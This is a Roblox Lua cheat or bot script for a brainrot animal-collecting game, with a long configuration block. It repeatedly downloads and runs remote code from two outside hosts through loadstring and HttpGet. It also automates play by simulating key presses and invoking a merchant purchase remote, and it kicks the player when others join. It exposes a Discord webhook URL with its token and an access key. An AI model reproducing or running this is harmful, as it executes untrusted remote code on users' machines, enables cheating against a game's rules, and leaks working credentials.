spawn(function()
    _G.Config={UserID="af98f8db-b72a-41ad-bfec-3f4182bc93e6",discord_id="1065861794494689402",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/sab"))()end)if s then break end wait(5)end
end)

setfpscap(5)

getgenv().Key = "k848a5227cffb8c1f16c72b2"
getgenv().Config = {
    ["Gameplay"] = {
        ["Server Type"] = "Private (Clone)",
        ["Collect Cash Cap"] = "1000B",
        ["Max Auctioning Multiplier"] = 10,
        ["Lock Base Extra Time"] = 5,
    },
    ["Misc"] = {
        ["Kick if Ping above"] = 5000,
        ["Kick if FPS below"] = 1,
        ["Ignore Secret"] = {
            ["La Vacca Saturno Saturnita"] = { "All" },
            ["Karkerkar Kurkur"] = { "All" },
            ["Sammyni Spyderini"] = { "All" },
            ["Extinct Tralalero"] = { "All" },
            ["Extinct Matteo"] = { "All" },
            ["Dul Dul Dul"] = { "All" },
            ["Chachechi"] = { "All" },
            ["Los Tralaleritos"] = { "All" },
            ["Las Tralaleritas"] = { "All" },
            ["La Cucaracha"] = { "All" },
            ["Job Job Job Sahur"] = { "All" },
            ["Frankentteo"] = { "All" },
            ["Graipuss Medussi"] = { "All" },
            ["Zombie Tralala"] = { "All" },
            ["Perrito Burrito"] = { "All" },
            ["To to to Sahur"] = { "All" },
            ["Guerriro Digitale"] = { "All" },
            ["Coffin Tung Tung Tung Sahur"] = { "All" },
            ["Nooo My Hotspot"] = { "All" },
            ["La Grande Combinasion"] = { "All" },
            ["Chicleteira Bicicleteira"] = { "All" },
            ["La Vacca Prese Presente"] = { "All" },
            ["Ho Ho Ho Sahur"] = { "All" },
        },
        ["Auto Fuse"] = {
            ["Enable"] = true,
            ["Fuse Animal"] = {
                ["La Vacca Saturno Saturnita"] = { "All" },
                ["Chachechi"] = { "All" },
                ["Chicleteira Bicicleteira"] = { "All" },
                ["Dul Dul Dul"] = { "All" },
                ["Graipuss Medussi"] = { "All" },
                ["Jackorilla"] = { "All" },
                ["Job Job Job Sahur"] = { "All" },
                ["Guerriro Digitale"] = { "All" },
                ["Karkerkar Kurkur"] = { "All" },
                ["La Cucaracha"] = { "All" },
                ["La Grande Combinasion"] = { "All" },
                ["Las Tralaleritas"] = { "All" },
                ["Los 25"] = { "All" },
                ["Los Combinasionas"] = { "All" },
                ["Los Jobcitos"] = { "All" },
                ["Los Tortus"] = { "All" },
                ["Pumpkini Spyderini"] = { "All" },
                ["Sammyni Spyderini"] = { "All" },
                ["Santa Hotspot"] = { "All" },
                ["Telemorte"] = { "All" },
                ["To to to Sahur"] = { "All" },
                ["Trickolino"] = { "All" },
                ["Triplito Tralaleritos"] = { "All" },
                ["Zombie Tralala"] = { "All" },
                ["Chimnino"] = { "All" },
                ["Bunnyman"] = { "All" },
                ["Please my Present"] = { "All" },
                ["Reindeer Tralala"] = { "All" },
                ["La Vacca Prese Presente"] = { "All" },
                ["Ho Ho Ho Sahur"] = { "All" },
            },
        },
        ["Rare Animal Generation"] = "20M",
        ["Open Lucky Block"] = {
            "Admin Lucky Block",
            "Taco Lucky Block",
            "Los Lucky Blocks",
            "Spooky Lucky Block",
            "Los Taco Blocks",
            "Festive Lucky Block",
        },
        ["Buy Lucky Block"] = {
            "Premium Festive Lucky Block",
            "Secret Lucky Block",
            "Festive Lucky Block",
            "Admin Lucky Block",
            "Taco Lucky Block",
            "Los Lucky Blocks",
            "Spooky Lucky Block",
            "Los Taco Blocks",
        },
    },
    ["Performance"] = {
        ["Boost FPS"] = true,
        ["Black Screen"] = true,
    },
    ["Webhook"] = {
        ["Enable"] = true,
        ["Url"] = "https://discord.com/api/webhooks/1417865473567101069/QZZ0Zql6Y95jct0KQMAQYzxYgmzPexssStT7SQzR6zxatgtNqhGod2FD3HdBOrmAt_TH",
        ["Ignore Notify"] = {},
    }
}
spawn(function()
    task.wait(200)
    if not getgenv().scriptLoaded then
        game.Players.LocalPlayer:Kick("Script load timeout\nKick to prevent animal gets stolen")
    end
end)
repeat
    wait()
    spawn(function()
        loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()
    end)
    wait(20)
until getgenv().Joebiden

-- event
spawn(function()
    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local player = Players.LocalPlayer

    local WAIT_TIME = 15
    local SPAM_DURATION = 60
    local totalElfsSeen = 0
    local activeSpamThread = nil
    local originalRequire = require
    local vim = game:GetService("VirtualInputManager")

    local function holdE(duration, elfNumber)
        -- Cancel any existing hold thread
        if activeSpamThread then
            task.cancel(activeSpamThread)
        end

        activeSpamThread = task.spawn(function()
            local startTime = os.clock()
            local endTime = startTime + duration
            local holdCycles = 0

            while os.clock() < endTime do
                vim:SendKeyEvent(true, Enum.KeyCode.E, false, game)
                task.wait(1.2)
                vim:SendKeyEvent(false, Enum.KeyCode.E, false, game)
                holdCycles = holdCycles + 1
                task.wait(0.2)
            end

            print("[Elf #" .. elfNumber .. "] " .. holdCycles .. " cycles")
            activeSpamThread = nil
            task.spawn(buySantaMerchantItem)
        end)
    end

    function buySantaMerchantItem()
        pcall(function()
            local Datas = ReplicatedStorage:WaitForChild("Datas", 5)
            if not Datas then return end
            local Shared = ReplicatedStorage:WaitForChild("Shared", 5)
            if not Shared then return end
            local Packages = ReplicatedStorage:WaitForChild("Packages", 5)
            if not Packages then return end

            local SantaMerchantData = require(Datas.SantaMerchantData)
            local Animals = require(Shared.Animals)
            local Net = require(Packages.Net)

            local function getGeneration(name)
                local s, g = pcall(function() return Animals:GetGeneration(name) end)
                return s and g or 0
            end

            local function getStock(name)
                return ReplicatedStorage:GetAttribute("SantaMerchant_" .. string.gsub(name, "%s", "_")) or 0
            end

            local best = nil
            local highestGen = 0

            for i, item in ipairs(SantaMerchantData.Brainrots) do
                local gen = getGeneration(item.Brainrot)
                local stock = getStock(item.Brainrot)
                if stock > 0 and gen > highestGen then
                    highestGen = gen
                    best = {Index = i, Name = item.Brainrot, Price = item.Price}
                end
            end

            if best then
                print("[Santa] " .. best.Name .. " (" .. best.Price .. " elves)")
                local remote = Net:RemoteFunction("SantaMerchantService/Buy")
                local s, r = pcall(function()
                    return remote:InvokeServer("2298b248-44dd-4a34-bbfe-e1174e8ae1b4", best.Index)
                end)
                if s and r then
                    print("[Santa] Bought " .. best.Name)
                end
            end
        end)
    end

    local function setupGoldElfDetection()
        local s, Net = pcall(function()
            return originalRequire(ReplicatedStorage.Packages.Net)
        end)
        if not s or not Net then return false end

        local s2, event = pcall(function()
            return Net:RemoteEvent("GameService/SpawnEffect")
        end)
        if not s2 or not event then return false end

        event.OnClientEvent:Connect(function(name, _, _, pos)
            if not name then return end
            local lower = string.lower(tostring(name))
            if not (string.find(lower, "gold", 1, true) and string.find(lower, "elf", 1, true)) then
                return
            end

            totalElfsSeen = totalElfsSeen + 1
            local num = totalElfsSeen

            local dist = "?"
            pcall(function()
                if pos and player.Character then
                    local hrp = player.Character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local p = typeof(pos) == "CFrame" and pos.Position or pos
                        if typeof(p) == "Vector3" then
                            dist = math.floor((hrp.Position - p).Magnitude)
                        end
                    end
                end
            end)

            print("[Elf #" .. num .. "] " .. dist .. " studs - waiting " .. WAIT_TIME .. "s")

            task.spawn(function()
                task.wait(WAIT_TIME)
                holdE(SPAM_DURATION, num)
            end)
        end)

        return true
    end

    local start = os.clock()
    while not game:IsLoaded() and os.clock() - start < 30 do
        task.wait(0.5)
    end
    task.wait(1)

    if setupGoldElfDetection() then
        print("[Ready] Elf collector + Santa buyer")
    end
end)

-- kick
spawn(function()
    task.wait(100)
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer

    local function instantKick()
        if #Players:GetPlayers() > 1 then
            LocalPlayer:Kick("CÚT")
        end
    end

    instantKick()
    Players.PlayerAdded:Connect(instantKick)
    game:GetService("RunService").Heartbeat:Connect(instantKick)

end)









